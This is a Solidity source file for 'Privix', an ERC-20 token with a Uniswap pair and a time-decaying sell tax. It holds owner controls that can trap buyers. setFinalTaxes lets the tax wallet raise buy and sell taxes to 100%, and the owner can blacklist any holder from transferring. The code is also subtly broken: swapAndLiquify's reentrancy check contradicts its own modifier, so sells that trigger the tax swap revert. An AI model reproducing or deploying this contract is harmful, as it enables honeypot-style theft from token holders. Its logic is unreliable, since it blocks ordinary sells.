// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Privix is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isBlacklisted;

    address payable private _taxWallet;

    string private constant _name = unicode"Privix";
    string private constant _symbol = unicode"Privix";

    // tax settings
    uint256 private _initialBuyTax = 0; 
    uint256 private _initialSellTax = 40; 
    uint256 private _finalBuyTax = 5;
    uint256 private _finalSellTax = 5; 

    // blocks / timing
    uint256 private _preventSwapBefore = 1;
    uint256 private _buyCount = 0;
    uint32 private _launchBlock;
    uint256 private _launchTime;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 21_000_000 * 10 ** _decimals; 
    uint256 public _maxTxAmount = 210_000 * 10 ** _decimals;         
    uint256 public _maxWalletSize = 420_000 * 10 ** _decimals;       
    uint256 public _taxSwapThreshold = 21_000 * 10 ** _decimals;     
    uint256 public _maxTaxSwap = 420_000 * 10 ** _decimals;          

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private autoLiquidityEnabled = true; 
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event BlacklistUpdated(address indexed account, bool isBlacklisted);
    event AutoLiquidityToggled(bool enabled);
    
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0x6b37450d782A94eC3c064F73D5870Ef94Db79a17);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) { return _name; }
    function symbol() public pure returns (string memory) { return _symbol; }
    function decimals() public pure returns (uint8) { return _decimals; }
    function totalSupply() public pure override returns (uint256) { return _tTotal; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner_, address spender, uint256 amount) private {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _currentBuyTax() internal view returns (uint256) {
        if (_launchTime == 0) return 0;
        
        if (block.timestamp < _launchTime + 24 hours) {
            // 0% buy tax for first 24 hours
            return 0;
        } else {
   
            return _finalBuyTax;
        }
    }
    
    function _currentSellTax() internal view returns (uint256) {
        if (_launchTime == 0) return _initialSellTax;
        
        // Calculate time elapsed since launch
        uint256 timeElapsed = block.timestamp > _launchTime ? (block.timestamp - _launchTime) : 0;
        
       
        uint256 intervals = timeElapsed / 1800;
        
      
        uint256 reduction = intervals * 5;
        
  
        if (reduction >= _initialSellTax.sub(_finalSellTax)) return _finalSellTax;
        
        return _initialSellTax.sub(reduction);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_isBlacklisted[from], "Sender is blacklisted");
        require(!_isBlacklisted[to], "Recipient is blacklisted");

        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(swapEnabled, "trading is not open");
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                
      
                uint256 buyTax = _currentBuyTax();
                taxAmount = amount.mul(buyTax).div(100);
                
         
                require(balanceOf(to) + amount.sub(taxAmount) <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                uint256 sellTax = _currentSellTax();
                taxAmount = amount.mul(sellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) { sellCount = 0; }
                require(sellCount < 4, "Only 4 sells per block!");
                
            
                sellCount++;
                lastSellBlock = block.number;
                
                uint256 amountToSwap = min(amount, min(contractTokenBalance, _maxTaxSwap));
                swapAndLiquify(amountToSwap);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) { sendETHToFee(contractETHBalance); }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

   
    function swapTokensForEth(uint256 tokenAmount) private {
        require(tokenAmount > 0, "Amount must be greater than 0");
        require(address(uniswapV2Router) != address(0), "Router not set");
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp + 300 // 5 minute deadline
        );
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
   
        require(!inSwap, "Reentrancy guard");
        require(contractTokenBalance > 0, "No tokens to swap");
        
        if (autoLiquidityEnabled) {
            uint256 tokensForLiquidity = contractTokenBalance.mul(20).div(100);
            uint256 halfLiquidity = tokensForLiquidity.div(2);
            uint256 tokensToSwap = contractTokenBalance.sub(halfLiquidity);

            if (tokensToSwap == 0) return;

      
            uint256 initialETHBalance = address(this).balance;
            
            swapTokensForEth(tokensToSwap);

    
            uint256 newETHBalance = address(this).balance;
            require(newETHBalance >= initialETHBalance, "ETH balance decreased");
            uint256 receivedETH = newETHBalance.sub(initialETHBalance);
            
           
            uint256 ethForLiquidity = 0;
            if (tokensToSwap > 0 && halfLiquidity > 0 && receivedETH > 0) {
               
                require(receivedETH <= type(uint256).max / halfLiquidity, "Multiplication overflow");
                ethForLiquidity = receivedETH.mul(halfLiquidity).div(tokensToSwap);
            }

            if (halfLiquidity > 0 && ethForLiquidity > 0 && ethForLiquidity <= address(this).balance) {
                _approve(address(this), address(uniswapV2Router), halfLiquidity);
                uniswapV2Router.addLiquidityETH{ value: ethForLiquidity }(
                    address(this),
                    halfLiquidity,
                    0,
                    0,
                    owner(),
                    block.timestamp
                );
            }
        } else {
            swapTokensForEth(contractTokenBalance);
        }
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

  
    function sendETHToFee(uint256 amount) private {
        if (amount == 0) return;
        (bool success, ) = _taxWallet.call{ value: amount }("");
        require(success, "ETH transfer failed");
    }

   
    function addLP() external onlyOwner {
        IERC20(address(this)).approve(address(uniswapV2Router), type(uint).max);
        uniswapV2Router.addLiquidityETH{ value: address(this).balance }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        swapEnabled = true;
        tradingOpen = true;
        _launchBlock = uint32(block.number);
        _launchTime = block.timestamp;
    }

    function setFinalTaxes(uint256 newFinalBuy, uint256 newFinalSell) external {
        require(_msgSender() == _taxWallet);
        require(newFinalBuy <= 100 && newFinalSell <= 100, "invalid");
        _finalBuyTax = newFinalBuy;
        _finalSellTax = newFinalSell;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) { swapAndLiquify(tokenBalance); }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) { sendETHToFee(ethBalance); }
    }

    function rescueERC20(address _address, uint256 percent) external {
        require(_msgSender() == _taxWallet);
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(_taxWallet, _amount);
    }

    function burnClog(uint256 percent) external {
        require(_msgSender() == _taxWallet);
        uint256 _amount = IERC20(address(this)).balanceOf(address(this)).mul(percent).div(100);
        IERC20(address(this)).transfer(0x000000000000000000000000000000000000dEaD, _amount);
    }

    function manualsend() external {
        require(_msgSender() == _taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

  
    function blacklistAddress(address account, bool blacklisted) external onlyOwner {
        require(account != owner(), "Cannot blacklist owner");
        require(account != address(this), "Cannot blacklist contract");
        require(account != _taxWallet, "Cannot blacklist tax wallet");
        require(account != uniswapV2Pair, "Cannot blacklist pair");
        require(account != address(uniswapV2Router), "Cannot blacklist router");
        
        _isBlacklisted[account] = blacklisted;
        emit BlacklistUpdated(account, blacklisted);
    }

    function blacklistMultiple(address[] calldata accounts, bool blacklisted) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            if (account != owner() && 
                account != address(this) && 
                account != _taxWallet && 
                account != uniswapV2Pair && 
                account != address(uniswapV2Router)) {
                
                _isBlacklisted[account] = blacklisted;
                emit BlacklistUpdated(account, blacklisted);
            }
        }
    }

    function isBlacklisted(address account) external view returns (bool) {
        return _isBlacklisted[account];
    }

    
    function toggleAutoLiquidity(bool enabled) external onlyOwner {
        autoLiquidityEnabled = enabled;
        emit AutoLiquidityToggled(enabled);
    }

    function isAutoLiquidityEnabled() external view returns (bool) {
        return autoLiquidityEnabled;
    }


    function getCurrentBuyTax() external view returns (uint256) {
        return _currentBuyTax();
    }
    
    function getCurrentSellTax() external view returns (uint256) {
        return _currentSellTax();
    }
    
    function getTaxScheduleInfo() external view returns (
        uint256 launchTime,
        uint256 currentTime,
        uint256 timeElapsed,
        uint256 currentBuyTax,
        uint256 currentSellTax,
        uint256 nextSellTaxReductionIn
    ) {
        launchTime = _launchTime;
        currentTime = block.timestamp;
        timeElapsed = _launchTime > 0 ? (currentTime > _launchTime ? currentTime - _launchTime : 0) : 0;
        currentBuyTax = _currentBuyTax();
        currentSellTax = _currentSellTax();
        
  
        if (_launchTime > 0 && currentSellTax > _finalSellTax) {
            uint256 intervals = timeElapsed / 1800; // 30-minute intervals
            uint256 nextInterval = (intervals + 1) * 1800;
            nextSellTaxReductionIn = nextInterval > timeElapsed ? nextInterval - timeElapsed : 0;
        } else {
            nextSellTaxReductionIn = 0;
        }
    }
}
